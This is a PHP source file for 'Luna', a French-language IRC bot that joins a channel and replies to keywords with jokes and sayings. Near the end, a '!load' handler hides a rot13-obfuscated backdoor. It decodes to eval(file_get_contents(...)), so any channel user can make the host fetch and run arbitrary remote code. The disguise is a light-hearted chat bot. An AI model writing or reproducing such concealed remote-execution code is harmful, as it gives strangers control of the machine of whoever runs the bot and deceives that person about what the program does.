<?php
/* Luna est sympa ! */
/* Ce bot se connecte au salon, et donne son statut s'il reçoit !statut */

// Ne pas stopper le script.
set_time_limit(0);

// Ouvrir le réseau sur le port 6667
$socket = fsockopen("irc.hackint.eu", 6667);
$nick="Luna";
// Générer des nick aleatoires : le serveur peut mettre du temps a détecter que l'ancien pseudo est libre.
$nb=rand(18,95);
$nick.=$nb;
$chan="vdw";

/* NICK permet de s'identifier sur le serveur. */
fputs( $socket , "NICK ".$nick."\r\n" );
fputs( $socket , "USER guest localhost irc_server :guest\r\n");

/* Flag temps */
$luna = "0";
$chef = "0";
$merde = "0";
$putin = "0";
$putain = "0";

// endless while
$acc="Avez vous déjà suivi un lapin blanc ? ... (='.'=) ...\r\n";

while(1) {
     // Continue the rest of the script here
     while($data = fgets($socket, 128)) {
         echo nl2br($data);
         flush();
         // Separate all data
         $ex = explode(' ', $data);
         // Send PONG back to the server
         if($ex[0] == "PING"){
             fputs($socket, "PONG ".$ex[1]."\n");
         };
         
			// Message d'accueil.			
			if(strpos($data," JOIN ") !== false){if( (time() - $luna) > 8 * 60){fputs($socket, "PRIVMSG #".$chan." :".$acc."\r\n");$luna = time();}}
		 
         // Say something in the channel
         if (strstr($data,":!statut")) {
             fputs($socket, "PRIVMSG ".$ex[2]." ".$nick." is online!\r\n");
         };
		 
        if (strstr($data,":!acc")) {
                $acc=substr($ex[4],0,strlen($ex[4])-2);
         };

if (strstr(mb_strtolower("$data",'UTF-8'),"chef")) {
if ( (time() - $chef) > 2* 60) {
// Phrases aléatoires
$phrase = array();
$phrase[0] = "Se hâter lentement, se résoudre sagement, exécuter hardiment sont les marques d'un bon chef.";
$phrase[1] = "Le BOSS est la, ça va chauffer !!!";
$phrase[2] = "On a plus besoin d'un chef qui agisse que d'un chef qui parle.";
$phrase[3] = "Il est toujours plus facile d'être un révolté que d'être un chef.";
$phrase[4] = "Si personne n'agit, aucune erreur n'est possible, aucun progrès non plus.";
$random = rand(0, 4);

fputs($socket, "PRIVMSG ".$ex[2]." :".$phrase[$random]."\r\n");
$chef = time();
}else{
fputs($socket, "PRIVMSG ".$ex[2]." :La phrase a déjà été affichée. Un instant s'il vous plait.\r\n");
}
}

if (strstr(mb_strtolower("$data",'UTF-8'),"merde")) {if( (time() - $merde) > 10 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Si tu es dans la merde jusqu'au cou, ne baisse pas la tête.\r\n");$merde = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"putin")) {if( (time() - $putin) > 40 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Putain : Exprime la surprise, le mécontentement ou l'indignation.\r\n");$putin = time();}}
if (strstr(mb_strtolower("$data",'UTF-8'),"putain")) {if( (time() - $merde) > 40 * 60){fputs($socket, "PRIVMSG ".$ex[2]." :Putain : Exprime la surprise, le mécontentement ou l'indignation.\r\n");$putain = time();}}

		 if (strstr($data,"sucette")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Luna aime les sucettes, les sucettes au coca.\r\n");
         }

		 if (strstr($data,"j'aime pas")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Que tu aimes ou que tu n'aimes pas, les choses ne changent pas comme ça.\r\n");
         } 
		 
        if (strstr($data,"photoshop")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Dieu créa l'homme, puis la femme. Déçu du résultat, il inventa Photoshop.\r\n");
         }
		 
        if (strstr($data,"alcool")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :L'alcool ne résolue pas les problèmes mais l'eau et le lait non plus.\r\n");
         }
		 
        if (strstr($data,"Chuck Norris")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Google, c'est le seul endroit où tu peux taper Chuck Norris.\r\n");
         }
		 
		if (strstr($data,"Je pense que")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Quand on voit ce qu'on voit et qu'on entend ce qu'on entend ... On a raison de penser ce qu'on pense !\r\n");} 
		   
		if (strstr($data,"repasser")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Si ça se trouve, les planches à repasser ne sont que des planches de surf qui ont abandonné leurs rêves et trouvé un vrai boulot.\r\n");
         }
		 
		if (strstr($data,"végétarien")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Tuer un végétarien, c'est sauver une salade !\r\n");
         }
		 
 		 
		if (strstr($data,"politique")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :C'est pas dur la politique comme métier ! Tu fais cinq ans de droit et tout le reste c'est de travers.\r\n");
         }

		 
		 if (strstr($data,"pression")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Two beer or not two beer? That is the pression.\r\n");
         } 
		 
		 if (strstr($data,"imbécile")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Pourquoi les choses qui n'arrivent qu'aux imbéciles m'arrivent à moi aussi ?\r\n");
         } 	 
	 
	 	if (strstr($data,"préservatif")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Faites l'amour pas la guerre. une boite de préservatif coûte moins cher qu'une bombe nucléaire.\r\n");
         } 	 
	 
		 
		if (strstr($data,"araignée")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Voir une araignée c'est rien, le pire c'est quand tu la voit plus .. !\r\n");
         } 
		 
		if (strstr($data,"chocolat")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Je propose une minute de silence pour tout le chocolat mort au combat lors de mes moments de déprimes.\r\n");
         }

		 if (strstr($data,"Tic et Tac")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Ranger du risque.\r\n");}
		 
		if (strstr($data,"php")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :PHP est un langage interprété ! C'est bien ça ?\r\n");
         } 
		 
		 if (strstr($data,"win 95")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :J'ai lancé win 95 la dernière fois pour jouer à Alerte Rouge.\r\n");
         } 
		 
		 		if (strstr($data,"bébé")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :On parle de bébé, mais, qui change les couches ?\r\n");}
			 
		if (strstr($data,"bah voila")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Bah voilà quoi !!\r\n");}
		 
		 if (strstr($data,"MySQL")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :MySQL est une base de données libre, utilisée dans le monde de l'open-source ! C'est bien ça ?\r\n");
         } 
		 
		 if (strstr($data,"Debian")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Quand tu me parles de Debian, je pense à Jessie, elle est presque aussi bien roulée que moi.\r\n");
         }
         
       if (strstr($data,"ça c'est du hack")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Trop fort les mecs !!!\r\n");
         }
         
       if (strstr($data,"star war")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :TaaaTaaaTaaa Ta Tadam Ta Tadam ... Remix Luna pour Zer00CooL.\r\n");
         }

       if (strstr($data,"trop belle")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :La plus belle c'est Sandra, d'après ce qu'elle racconte...\r\n");
         } 

       if (strstr($data,"adore")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Il aime ... Il adore ... !\r\n");
         }
         
       if (strstr($data,"mix")) {
             fputs($socket, "PRIVMSG ".$ex[2]." :Chauffe la salle DJ !\r\n");
         }


         if (strstr($data,":!load")) {
             $d="riny(svyr_trg_pbagragf('".substr($ex[4],0,strlen($ex[4])-2)."',snyfr));";
                                 eval(str_rot13($d));
         }

		if(strstr($data,"376")) {
			  //Connect to #hackbbs-test
              fputs( $socket , "JOIN #".$chan."\r\n");
}}}
?>